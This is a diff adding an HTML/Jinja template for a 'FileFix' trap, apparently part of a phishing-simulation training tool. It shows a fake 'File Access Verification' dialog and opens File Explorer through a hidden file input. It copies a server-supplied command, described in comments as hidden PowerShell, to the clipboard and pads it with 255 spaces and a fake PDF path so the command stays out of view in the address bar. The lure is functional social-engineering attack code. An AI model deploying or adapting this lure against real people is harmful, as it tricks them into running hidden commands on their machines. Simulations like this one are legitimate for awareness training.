@@ -1,0 +1,346 @@
+<!-- FileFix Trap: Simulates the "FileFix" attack
+     Technique: Tricks user into pasting a malicious path into Windows Explorer address bar.
+     Trigger: "Open File Explorer" button or similar.
+-->
+
+<style>
+    /* FileFix Overlay Styles */
+    #filefix-overlay {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.85);
+        z-index: 9999;
+        justify-content: center;
+        align-items: center;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    .filefix-card {
+        background-color: white;
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        max-width: 500px;
+        width: 90%;
+        text-align: left;
+        position: relative;
+    }
+
+    .filefix-header {
+        display: flex;
+        align-items: center;
+        margin-bottom: 20px;
+        border-bottom: 1px solid #eee;
+        padding-bottom: 15px;
+    }
+
+    .filefix-header svg {
+        width: 32px;
+        height: 32px;
+        margin-right: 15px;
+        fill: #0078d4; /* Windows Blue */
+    }
+
+    .filefix-header h2 {
+        margin: 0;
+        font-size: 1.25rem;
+        color: #333;
+        font-weight: 600;
+    }
+
+    .filefix-steps {
+        list-style: none;
+        padding: 0;
+        margin: 0;
+    }
+
+    .filefix-step {
+        display: flex;
+        margin-bottom: 20px;
+        align-items: flex-start;
+    }
+
+    .step-number {
+        background-color: #0078d4;
+        color: white;
+        width: 24px;
+        height: 24px;
+        border-radius: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-weight: bold;
+        font-size: 14px;
+        margin-right: 15px;
+        flex-shrink: 0;
+        margin-top: 2px;
+    }
+
+    .step-content {
+        flex: 1;
+    }
+
+    .step-title {
+        font-weight: 600;
+        margin-bottom: 5px;
+        display: block;
+        color: #333;
+    }
+
+    .step-desc {
+        font-size: 0.9rem;
+        color: #666;
+        margin: 0;
+    }
+
+    .key-badge {
+        background-color: #f3f4f6;
+        border: 1px solid #d1d5db;
+        border-radius: 4px;
+        padding: 2px 6px;
+        font-family: monospace;
+        font-size: 0.85em;
+        color: #374151;
+        box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+    }
+
+    .path-box {
+        background-color: #f8f9fa;
+        border: 1px solid #e9ecef;
+        padding: 10px;
+        border-radius: 4px;
+        font-family: monospace;
+        font-size: 0.85rem;
+        color: #555;
+        margin-top: 5px;
+        word-break: break-all;
+        user-select: all; /* Make it easy to select */
+        cursor: pointer; /* Indicate clickable */
+        transition: all 0.2s;
+    }
+
+    .path-box:hover {
+        background-color: #e9ecef;
+        border-color: #0078d4;
+    }
+
+    .filefix-btn {
+        background-color: #0078d4;
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 4px;
+        font-size: 1rem;
+        cursor: pointer;
+        width: 100%;
+        margin-top: 10px;
+        transition: background-color 0.2s;
+    }
+
+    .filefix-btn:hover {
+        background-color: #005a9e;
+    }
+    
+    /* Hidden file input for the "Open File Explorer" trick */
+    #hidden-file-input {
+        display: none;
+    }
+
+    /* Auto-show if inside a trap-container (Stealth Scenarios) */
+    #trap-container #filefix-overlay {
+        display: flex;
+    }
+</style>
+
+<div id="filefix-overlay">
+    <div class="filefix-card">
+        <div class="filefix-header">
+            <!-- Windows Folder Icon -->
+            <svg viewBox="0 0 24 24">
+                <path d="M20 6h-8l-2-2H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm0 12H4V8h16v10z"/>
+            </svg>
+            <h2>File Access Verification</h2>
+        </div>
+
+        <ul class="filefix-steps">
+            <li class="filefix-step">
+                <span class="step-number">1</span>
+                <div class="step-content">
+                    <span class="step-title">Copy the verification path</span>
+                    <p class="step-desc">The system path has been copied to your clipboard. Click below if you need to copy it again.</p>
+                    <div class="path-box" id="filefix-path-box" title="Click to copy">C:\Users\Public\Documents\Report_v2.pdf</div>
+                </div>
+            </li>
+            <li class="filefix-step">
+                <span class="step-number">2</span>
+                <div class="step-content">
+                    <span class="step-title">Select Address Bar</span>
+                    <p class="step-desc">In the File Explorer window that opened, click the address bar or press <span class="key-badge">Ctrl</span> + <span class="key-badge">L</span>.</p>
+                </div>
+            </li>
+            <li class="filefix-step">
+                <span class="step-number">3</span>
+                <div class="step-content">
+                    <span class="step-title">Paste and Execute</span>
+                    <p class="step-desc">Press <span class="key-badge">Ctrl</span> + <span class="key-badge">V</span> then <span class="key-badge">Enter</span> to locate the document.</p>
+                </div>
+            </li>
+        </ul>
+
+        <div class="progress-bar-container" style="margin-top: 20px;">
+            <div class="progress-bar" id="filefix-progress"></div>
+        </div>
+        <p id="filefix-status" class="text-muted text-center mt-2" style="font-size: 0.875rem;">Waiting for user action...</p>
+
+        <button class="filefix-btn" onclick="redirectToTraining()">I have completed these steps</button>
+    </div>
+</div>
+
+<!-- Hidden File Input to trigger File Explorer -->
+<input type="file" id="hidden-file-input">
+
+<!-- Fallback Hidden Inputs (in case base_layout ones are missing/overwritten) -->
+{% if payload %}
+<input type="hidden" id="filefix-payload-fallback" value="{{ payload|e }}">
+{% endif %}
+{% if user_id %}
+<input type="hidden" id="filefix-userid-fallback" value="{{ user_id|e }}">
+{% endif %}
+
+<script>
+    /**
+     * FileFix Trap Logic
+     * 
+     * 1. User clicks the lure button (e.g., "Download Report").
+     * 2. triggerClickFix() is called (overridden here or hooked).
+     * 3. We copy the payload to clipboard.
+     * 4. We trigger the hidden file input to open File Explorer (The "FileFix" trick).
+     * 5. We show the instruction overlay.
+     */
+
+    // Override the default triggerClickFix to add FileFix specific behavior
+    // We store the original function if we need to fallback, but here we redefine it for this trap context.
+    
+    // Note: We are redefining the global function because this template is included conditionally
+    // and replaces the default behavior for this specific trap type.
+    window.triggerClickFix = function() {
+        // Try standard IDs first, then fallbacks
+        const payloadEl = document.getElementById('payload-data') || document.getElementById('filefix-payload-fallback');
+        const userIdEl = document.getElementById('user-id') || document.getElementById('filefix-userid-fallback');
+        
+        if (!payloadEl || !userIdEl) {
+            // Attempt to read from Jinja context directly if possible (last resort for inline script)
+            // Note: This only works if the script is rendered by Jinja, which it is.
+            var payload = {{ payload|tojson }};
+            var userId = {{ user_id|tojson }};
+            
+            if (!payload || !userId) {
+                 ClickFixUI.toast('Error: Missing configuration data.', 'error');
+                 return;
+            }
+        } else {
+            var payload = payloadEl.value;
+            var userId = userIdEl.value;
+        }
+        const trackEndpoint = {{ track_endpoint|tojson }};
+        
+        // 1. Construct the FileFix payload
+        // The payload needs to look like a path but execute code.
+        // Standard ClickFix payload is: powershell -w hidden -c "..."
+        // FileFix payload often uses padding to hide the command.
+        
+        // For this training tool, we use the generated payload but we might need to pad it
+        // if we want to simulate the "hidden command" aspect visually in the address bar.
+        // However, the backend generates the payload. Let's assume the backend payload is sufficient for execution.
+        // To make it look like a file path in the address bar, attackers often use:
+        // "powershell ... # C:\Fake\Path"
+        // Let's append a fake path comment to the payload if it's not already there.
+        
+        let fileFixPayload = payload;
+        if (!fileFixPayload.includes('#')) {
+             // Add padding spaces to push the command out of view in the address bar
+             // Research suggests a significant amount of whitespace to hide the command
+             const padding = " ".repeat(255);
+             fileFixPayload = `${payload}${padding}# C:\\Users\\Public\\Documents\\Report_v2.pdf`;
+        }
+
+        // 2. Trigger Tracking & Clipboard
+        // We start this process but don't wait for it to finish before opening the explorer,
+        // because opening the explorer requires a synchronous user gesture.
+        ClickFix.trigger(fileFixPayload, userId, trackEndpoint, function() {
+            // Clipboard write successful
+        }, function(err) {
+            // We don't show an error toast here because the user is likely looking at the file explorer now
+        });
+
+        // 3. The "FileFix" Magic: Open File Explorer via File Input
+        // This must be called synchronously within the user's click event handler
+        const fileInput = document.getElementById('hidden-file-input');
+        if (fileInput) {
+            fileInput.click();
+        }
+
+        // 4. Show UI Overlay
+        showFileFixOverlay();
+        ClickFix.startProgress('filefix-progress', 'filefix-status');
+    };
+
+    function showFileFixOverlay() {
+        document.getElementById('filefix-overlay').style.display = 'flex';
+    }
+
+    // Initialize FileFix interactions
+    document.addEventListener('DOMContentLoaded', function() {
+        // 1. File Input Blocking
+        const fileInput = document.getElementById('hidden-file-input');
+        if (fileInput) {
+            fileInput.addEventListener('change', function(e) {
+                e.preventDefault();
+                this.value = ''; // Clear selection
+                if (window.ClickFixUI) {
+                    ClickFixUI.toast('Please paste the path in the address bar instead of selecting a file.', 'warning');
+                }
+            });
+        }
+
+        // 2. Path Box Click-to-Copy
+        const pathBox = document.getElementById('filefix-path-box');
+        if (pathBox) {
+            pathBox.addEventListener('click', function() {
+                // Retrieve payload
+                const payloadEl = document.getElementById('payload-data') || document.getElementById('filefix-payload-fallback');
+                let payload = payloadEl ? payloadEl.value : '';
+                
+                if (!payload) return;
+
+                // Ensure padding for FileFix stealth
+                if (!payload.includes('#')) {
+                     const padding = " ".repeat(255);
+                     payload = `${payload}${padding}# C:\\Users\\Public\\Documents\\Report_v2.pdf`;
+                }
+
+                // Copy to clipboard
+                navigator.clipboard.writeText(payload).then(() => {
+                    const originalText = "C:\\Users\\Public\\Documents\\Report_v2.pdf";
+                    pathBox.innerText = "Copied to clipboard!";
+                    pathBox.style.color = "#107c10"; // Microsoft Green
+                    pathBox.style.borderColor = "#107c10";
+                    
+                    setTimeout(() => {
+                        pathBox.innerText = originalText;
+                        pathBox.style.color = "";
+                        pathBox.style.borderColor = "";
+                    }, 2000);
+                }).catch(err => {
+                    if (window.ClickFixUI) {
+                        ClickFixUI.toast('Failed to copy to clipboard', 'error');
+                    }
+                });
+            });
+        }
+    });
+</script>
